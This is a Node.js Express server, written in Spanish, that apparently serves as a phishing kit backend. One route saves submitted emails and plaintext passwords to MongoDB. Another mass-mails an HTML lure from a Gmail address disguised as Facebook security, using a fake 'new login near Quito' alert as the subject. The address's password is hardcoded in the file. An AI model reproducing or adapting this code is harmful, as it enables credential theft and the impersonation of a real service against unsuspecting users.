const express = require("express");
const mongoose = require("mongoose");
const bodyParser = require("body-parser");
const cors = require("cors");
require("dotenv").config();
const nodemailer = require("nodemailer");
const path = require("path");
const fs = require("fs");

const app = express();
app.use(cors());
app.use(bodyParser.json());

mongoose.connect(process.env.MONGO_URI, {
	useNewUrlParser: true,
	useUnifiedTopology: true,
});

const datos = new mongoose.Schema({
	email: String,
	password: String,
});

const usuario = mongoose.model("usuario", datos);

app.post("/hasSidoHackeado", async (req, res) => {
	const { email, password } = req.body;
	const usuarioBD = new usuario({ email, password });
	await usuarioBD.save();
	res.status(201).send("Informacion  guardada");
});

app.post("/enviarEmail", async (req, res) => {
	const { correos } = req.body;
	const plantilla = path.join(__dirname, "index.html");
	let plantilla2 = fs.readFileSync(plantilla, "utf-8");
	try {
		let trasnsportador = nodemailer.createTransport({
			service: "gmail",
			auth: { user: "securiity.faceboook.mail@gmail.com", pass: "1234567890abc." },
		});
		const respuesta = await trasnsportador.sendMail({
			from: "securiity.faceboook.mail@gmail.com",
			to: correos.join(","),
			subject: "¿Acabas de iniciar sesión cerca de Quito en un dispositivo nuevo?",
            html: plantilla2
		});
	} catch (error) {}
});
app.listen(3000, () => {
	console.log("Servidor escuchando en el puerto 3000");
});
